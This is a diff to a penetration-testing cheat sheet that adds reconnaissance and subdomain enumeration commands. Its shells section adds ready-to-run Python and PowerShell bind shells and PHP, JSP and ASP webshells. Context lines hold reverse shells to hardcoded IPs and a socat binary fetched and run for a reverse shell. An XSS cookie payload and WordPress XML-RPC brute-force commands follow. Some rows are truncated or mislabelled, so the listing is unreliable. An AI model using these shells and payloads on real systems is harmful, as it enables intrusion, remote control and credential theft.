@@ -16,7 +16,9 @@
 ### Passive subdomains enumeration
  - [VirusTotal](https://www.virustotal.com/gui/home/upload) - Analyze suspicious files, domains, IPs and URLs to detect malware and other breaches
  - [Censys](https://censys.io/) - Censys continually scans the public IPv4 address space on 3,552+ ports using automatic protocol detection to present the most accurate representation of the Internet's current state.
- - [Censys](https://censys.io/) - Certificate search tool
+ - [Crt.sh](https://crt.sh/) - Certificate search tool
+ - [Sublist3r](https://github.com/aboul3la/Sublist3r) - Fast subdomains enumeration tool for penetration testers
+
 
 ## Active subdomains enumeration
  - [HackerTarget](https://hackertarget.com/zone-transfer/) - From attack surface discovery to vulnerability identification, actionable network intelligence for IT & security operations.
@@ -60,8 +62,16 @@
  - [Seclist](https://github.com/danielmiessler/SecLists) - Collection of multiple types of lists used during security assessments, collected in one place
  - [Hob0Rules](https://github.com/praetorian-inc/Hob0Rules) - Password cracking rules for Hashcat based on statistics and industry patterns
 
+### Formating
+ -[Html2text](https://github.com/aaronsw/html2text) - Convert HTML to Markdown-formatted text
 
 ## Sheetcheat
+
+### WHOIS
+| Description        | Command      |
+| ------ | ----- |
+| Assign target to an environment variable | ``export TARGET="domain.tld" ``|
+| WHOIS lookup for the target | `` whois $TARGET ``|
 
 ### Service Scanning
 | Description        | Command      |
@@ -96,6 +106,7 @@
 | Identify the TXT records for the target domain |`` dig txt $TARGET @<nameserver/IP> ``|
 | Identify the MX records for the target domain | `` nslookup -query=MX $TARGET `` |
 | Identify the MX records for the target domain |`` dig mx $TARGET @<nameserver/IP>	 ``|
+| Check the using of a specific DNS Server.|`` nslookup example.com ns1.nsexample.com ``|
 
 ### Passive Infrastructure Identification
 | Description        | Command      |
@@ -111,13 +122,22 @@
 | WAF Fingerprinting |`` wafw00f -v https://$TARGE ``|
 
 ### Passive Subdomain Enumeration
+| Description        | Command      |
+| ------ | ----- |
 | All subdomains for a given domain | `` curl -s https://sonar.omnisint.io/subdomains/{domain} | jq -r '.[]' | sort -u `` |
 | All TLDs found for a given domain | `` curl -s https://sonar.omnisint.io/tlds/{domain} | jq -r '.[]' | sort -u `` |
 | All results across all TLDs for a given domain | `` curl -s https://sonar.omnisint.io/all/{domain} | jq -r '.[]' | sort -u `` |
 | Reverse DNS lookup on IP address | `` curl -s https://sonar.omnisint.io/reverse/{ip} | jq -r '.[]' | sort -u `` |
 | Reverse DNS lookup of a CIDR range | `` curl -s https://sonar.omnisint.io/reverse/{ip}/{mask} | jq -r '.[]' | sort -u `` |
 | Certificate Transparency | ``curl -s "https://crt.sh/?q=${TARGET}&output=json" | jq -r '.[] | "\(.name_value)\n\(.common_name)"' | sort -u `` |
-| Searching for subdomains and other information on the sources provided in the source.txt list | `` cat sources.txt | while read source; do theHarvester -d "${TARGET}" -b $source -f "${source}-${TARGET}";done `` |
+| TheHarvester: searching for subdomains and other information on the sources provided in the source.txt list | `` cat sources.txt | while read source; do theHarvester -d "${TARGET}" -b $source -f "${source}-${TARGET}";done `` |
+| Sublist3r: to enumerate subdomains of specific domain | `` python sublist3r.py -d example.com ``|
+
+### Active Subdomain Enumeration
+| Description        | Command      |
+| ------ | ----- |
+| Gobuster: bruteforcing subdomains | `` gobuster dns -q -r "${NS}" -d "${TARGET}" -w "${WORDLIST}" -p ./patterns.txt -o "gobuster_${TARGET}.txt" `` |
+| Zone Transfer using Nslookup against the target domain and its nameserver | ``nslookup -type=any -query=AXFR $TARGET nameserver.target.domain `` |
 
 ### Web Enumeration
 | Description        | Command      |
@@ -169,13 +189,20 @@
 | Start a nc listener on a local port | `` nc -lvnp 1234 `` |
 | Send a reverse shell from the remote server | `` bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1' `` |
 | Another command to send a reverse shell from the remote server | `` rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f `` |
-| Start a bind shell on the remote server | `` rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1 \| nc -lvp 1234 >/tmp/f `` |
+| Start a bind shell (bash) | `` rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1 \| nc -lvp 1234 >/tmp/f `` |
+| Start a bind shell (python) | `` python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")' `` |
+| Start a bind shell (powershell) | `` powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(); `` |
 | Start a reverse shell from php | `` <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.14.2 4444 >/tmp/f"); ?> `` |
+| Add a reverse shell in php page | `` system($_GET['cmd']) ``; |
+| Open 
 | Connect to a bind shell started on the remote server | `` nc 10.10.10.1 1234	 `` |
 | Python: Upgrade shell TTY | ``python -c 'import pty; pty.spawn("/bin/bash")' `` |
 | Upgrade shell TTY (2) | `` ctrl+z then stty raw -echo then fg then enter twice `` |
+| Start a webshell (php) | `` <?php system($_REQUEST["cmd"]); ?> ``  |
+| Start a webshell (jsp) | `` <% Runtime.getRuntime().exec(request.getParameter("cmd")); %> ``  |
+| Start a webshell (asp) | `` <% eval request("cmd") %> ``  |
 | Create a webshell php file | `` echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php `` |
-| Execute a command on an uploaded webshell | `` curl http://SERVER_IP:PORT/shell.php?cmd=id `` |
+| Execute a command on an uploaded webshell | `` curl http://SERVER_IP:PORT/shell.php?cmd=COMMAND `` |
 | Start socat listener  | `` socat file:`tty`,raw,echo=0 tcp-listen:4444 `` |
 | Start a socat reverse shell on remote server | `` socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444 `` |
 | Download the corrrect socat architecture and exec reserse shell |  `` wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444 `` |
@@ -225,6 +252,26 @@
 | File upload with cURL | ``  curl -X PUT -d @test.txt http://example.com/test.txt -vv `` |
 | DELETE method with cURL | ``  curl -X DELETE http://example.com/test.txt -vv	`` |
 | cURL w/ POST |`` curl http://example.com:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded' `` |
+
+### XSS attacks
+| Description        | Command      |
+| ------ | ----- |
+| Get the cookie value | `` #"><img src=/ onerror=alert(document.cookie)> `` |
+
+### Wordpress hacking
+| Description        | Command      |
+| ------ | ----- |
+| Get wp core version | `` curl -s -X GET http://example.com \| grep '<meta name="generator"' `` |
+| Plugins enumeration | `` curl -s -X GET http://example.com \| sed 's/href=/\n/g' \| sed 's/src=/\n/g' \| grep 'wp-content/plugins/*' \| cut -d"'" -f2 `` |
+| Themes enumeration | `` curl -s -X GET http://example.com \| sed 's/href=/\n/g' \| sed 's/src=/\n/g' \| grep 'themes' \| cut -d"'" -f2 `` |
+| Check response header for file or directory | `` curl -I -X GET http://example.com/wp-content/plugins/form-contact/ \| html2text `` |
+| Check the user list with JSON | `` curl http://example.com/wp-json/wp/v2/users \| jq ``|
+| XML-RPC: Check if XML-RPC server accecpts requests | `` curl http://example.co    m/xmlrpc.php ``|
+| XML-RPC: Check if a user exists with POST | `` curl -s -I -X GET http://example.com/?author=1 `` |
+| XML-RPC: List all methods enabled| `` curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>user</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://example.com/xmlrpc.php \| grep "<value><string>"`` |
+| XML-RPC: Connect with credentials | `` curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>user</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://example.com/xmlrpc.php `` |
+| WPscan enumeration | `` wpscan --url http://example.com --enumerate --api-token TOKEN `` |
+| WPscan brute force login with XML-RPC |  `` wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://example.com ``|
 
 ### Misc
 | Description        | Command      |
